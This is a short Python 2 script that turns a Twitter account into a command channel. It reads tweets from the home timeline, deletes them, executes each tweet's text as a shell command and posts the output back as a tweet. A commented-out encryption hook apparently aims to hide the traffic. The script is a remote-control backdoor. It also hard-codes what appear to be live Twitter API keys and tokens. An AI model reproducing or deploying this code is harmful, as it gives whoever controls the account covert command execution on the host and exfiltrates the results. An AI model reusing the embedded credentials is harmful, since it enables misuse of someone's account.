import tweepy
#from newEncrypt import *
import subprocess
import os
from time import sleep


consumer_key = 'zLZ2NN1qemQChgVOae3QlgNtp'
consumer_secret = 'hbAZzMFdpff1sDHp50d4qt4l7QumyUfhxSybl5Smne1eTi2mEw'
access_token = '4827323871-Oig9GWZc6gkVUYK7oTkQO1O4dmoJLuCaY8vE6Dh'
access_token_secret = 'h2BMjDxt24XolArqy2vuRJYauMqKp2boNIgWUdHwlmGxD'

auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
auth.set_access_token(access_token, access_token_secret )
api = tweepy.API(auth)



 

count = 0


def listen():
	global count
	public_tweets = None
	while(not public_tweets):
		public_tweets = api.home_timeline()
		count = count +1
		if public_tweets:
			for tweet in public_tweets:
				test = str(tweet.text)			
				api.destroy_status(tweet.id)
				response = subprocess.check_output(test, shell=True)
				api.update_status(response)
				print response
			if count == 9:
				print "Sleeping for 15 minutes..."
				
				count = 0
				sleep(61 * 15)
			else:
				new_public_tweets = api.home_timeline()
				count = count +1
				for tweet in new_public_tweets:	
					#sleep(5)		
					api.destroy_status(tweet.id)						
				if count == 9:
					print "Sleeping for 15 minutes..."
					
					count = 0
					sleep(61 * 15)
				else: 		
					listen()
		else: 
			print("No tweets!")
			sleep(5)


if __name__ == "__main__":
	#while(1):
		listen()
	
#new_tweets = api.search(q='PhoenixKrazyKat', count=10)
#print new_tweets


	
		#bytes = str.encode(test)
		#type(bytes)	
		#mess = decode(bytes)
		
		#enResponse = encode(response) 
	
	
	#count = count + 1

	
	#print "Decoded message: " + mess
	#